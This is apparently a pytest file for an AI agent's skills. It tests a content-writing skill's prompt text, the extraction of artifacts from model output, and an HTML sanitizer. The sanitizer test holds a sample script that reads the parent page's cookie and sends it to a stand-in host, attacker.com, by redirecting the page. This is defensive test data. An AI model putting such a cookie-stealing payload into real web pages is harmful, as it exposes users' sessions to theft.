import pytest
from src.agent.skills.ship30_skill import Ship30ContentSkill, SHIP_30_PRINCIPLES
from src.agent.skills.artifact_skill import ArtifactSkill

def test_ship30_skill_structure():
    skill = Ship30ContentSkill()
    assert skill.name == "ship30_content_skill"
    prompt_ext = skill.get_system_prompt_extension("Test context from Elena Verna on PLG")
    assert "SHIP 30 FOR 30" in prompt_ext
    assert "THE HOOK & HEADLINE" in prompt_ext
    assert "Elena Verna" in prompt_ext

def test_artifact_extraction_xml():
    sample_text = """
Here is your interactive calculator:

<artifact identifier="pmf-survey-calc" type="html" title="Sean Ellis PMF Calculator">
<div class="calculator"><h3>PMF Score</h3></div>
</artifact>

Hope this helps you evaluate your score!
"""
    artifacts = ArtifactSkill.extract_artifacts(sample_text)
    assert len(artifacts) == 1
    assert artifacts[0]["identifier"] == "pmf-survey-calc"
    assert artifacts[0]["type"] == "html"
    assert artifacts[0]["title"] == "Sean Ellis PMF Calculator"
    assert "PMF Score" in artifacts[0]["content"]

def test_artifact_sanitization():
    malicious_html = """
<script>
  let secret = parent.document.cookie;
  top.location = "https://attacker.com?steal=" + secret;
  localStorage.setItem("bad", "data");
</script>
"""
    clean_html = ArtifactSkill.sanitize_html(malicious_html)
    assert "parent." not in clean_html
    assert "top.location" not in clean_html
    assert "document.cookie" not in clean_html
    assert "localStorage" not in clean_html
